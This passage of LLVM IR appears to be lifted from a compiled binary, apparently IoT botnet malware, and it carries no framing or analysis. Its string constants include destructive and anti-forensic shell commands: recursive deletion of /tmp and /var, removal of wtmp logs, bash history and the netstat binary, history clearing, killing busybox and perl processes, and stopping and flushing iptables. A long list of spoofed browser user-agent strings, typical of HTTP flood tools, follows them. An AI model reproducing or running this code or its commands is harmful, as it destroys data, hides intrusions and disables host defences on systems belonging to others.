i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e55c.824, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e4c8.812, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e564.825, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e56c.826, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e578.827, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e588.828, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e598.829, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e5a8.830, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e5b8.831, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e5c4.832, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e5d0.833, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e5e0.834, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e5f0.835, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e600.836, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e610.837, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e61c.838, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1e62c.839, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e640.840, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e64c.841, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e658.842, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e668.843, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e678.844, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e684.845, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e694.846, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e6a4.847, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e6b4.848, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e6c4.849, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e6d0.850, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e6dc.851, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e6ec.852, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e6fc.853, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e70c.854, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e71c.855, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e728.856, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1e738.857, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e74c.858, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e758.859, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1e764.860, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1e774.861, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e784.862, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e788.863, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e78c.864, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e790.865, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e794.866, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e798.867, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e79c.868, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e7a0.869, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1e7a4.870, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7a8.871, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7b0.872, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7b8.873, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7c0.874, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7c8.875, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7d0.876, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7d8.877, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7e0.878, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7e8.879, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7f0.880, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e7f8.881, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_1e800.882, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e814.883, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e820.884, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e82c.885, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e838.886, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e840.887, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e84c.888, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e858.889, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e860.890, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e86c.891, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e878.892, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e884.893, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e890.894, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e89c.895, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e8a8.896, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e8b4.897, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e8bc.898, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e8c4.899, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e8d0.900, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e8dc.901, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e8e8.902, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e8f4.903, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e900.904, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1e90c.905, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e920.906, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e92c.907, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e938.908, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e944.909, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e950.910, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e95c.911, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e968.912, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e974.913, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1e980.914, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e98c.915, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e994.916, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e99c.917, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e9a8.918, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e9b4.919, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e9c0.920, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e9cc.921, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1e9d8.922, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1e9e4.923, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1e9f8.924, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ea04.925, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ea10.926, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ea1c.927, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ea28.928, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ea34.929, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ea40.930, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ea4c.931, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ea58.932, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ea64.933, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ea6c.934, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ea74.935, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ea80.936, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ea8c.937, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ea98.938, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1eaa4.939, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1eab0.940, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1eabc.941, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ead0.942, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1eadc.943, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1eae8.944, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1eaf4.945, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1eb00.946, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1eb10.947, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1eb20.948, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eb30.949, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1eb40.950, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1eb50.951, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1eb5c.952, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eb68.953, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1eb78.954, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eb88.955, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eb98.956, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1eba8.957, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ebb8.958, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1ebc8.959, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ebe0.960, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ebf0.961, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ec00.962, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1ec10.963, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ec20.964, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1e564.825, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ec2c.965, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec38.966, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec40.967, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec48.968, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec50.969, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec58.970, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec60.971, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec68.972, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec70.973, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ec78.974, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ec80.975, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ec88.976, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ec90.977, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ec98.978, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1eca0.979, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1eca8.980, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ecb0.981, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ecb8.982, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ecc0.983, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ecc8.984, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ecd0.985, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecd8.986, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecdc.987, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ece0.988, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ece4.989, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ece8.990, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecec.991, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecf0.992, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecf4.993, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ecf8.994, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ecfc.995, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed00.996, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed04.997, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed08.998, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed0c.999, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed10.1000, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed14.1001, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed18.1002, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed1c.1003, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed20.1004, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed24.1005, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed28.1006, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ed2c.1007, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ed38.1008, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ed40.1009, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ed48.1010, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed50.1011, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed54.1012, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed58.1013, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed5c.1014, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed60.1015, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed64.1016, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed68.1017, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed6c.1018, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed70.1019, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed74.1020, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed7c.1021, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed84.1022, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed8c.1023, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed94.1024, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed9c.1025, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1eda4.1026, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1edac.1027, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1edb4.1028, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1edbc.1029, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1edc4.1030, i32 0, i32 0)]
@global_var_1fe50.1033 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_1fed4.1037 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_fa54.1038 = constant i32 -442564508
@global_var_1fee4.1040 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_1ff10.1042 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_1ff28.1044 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1ff40.1046 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_1ff50.1048 = constant [11 x i8] c"history -c\00"
@global_var_1ff5c.1050 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_1ff74.1052 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_1ff88.1054 = constant [11 x i8] c"history -w\00"
@global_var_1ff94.1056 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_1ffa8.1058 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_1ffb8.1060 = constant [22 x i8] c"service iptables stop\00"
@global_var_1ffd0.1062 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_2001c.1064 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_2005c.1065 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_2009c.1066 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_2012c.1067 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_20164.1068 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_20184.1069 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_2019c.1070 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_201f4.1071 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_20294.1072 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_202e8.1073 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_2035c.1074 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_2039c.1075 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_20454.1076 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_204a8.1077 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_20500.1078 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_20558.1079 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_20598.1080 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_205e0.1081 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_20638.1082 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_206a4.1083 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_206fc.1084 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_2074c.1085 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_20770.1086 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_207cc.1087 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_207dc.1088 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_2080c.1089 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_20830.1090 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_20854.1091 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_20870.1092 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_208b0.1093 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_2093c.1094 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_20984.1095 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_209cc.1096 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_20a14.1097 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_20a5c.1098 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_20ab0.1099 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_20b00.1100 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_20b6c.1101 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_20bc0.1102 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_20c1c.1103 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_20c78.1104 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_20cdc.1105 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_20d38.1106 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20d94.1107 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20df0.1108 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_20e50.1109 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_20e98.1110 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
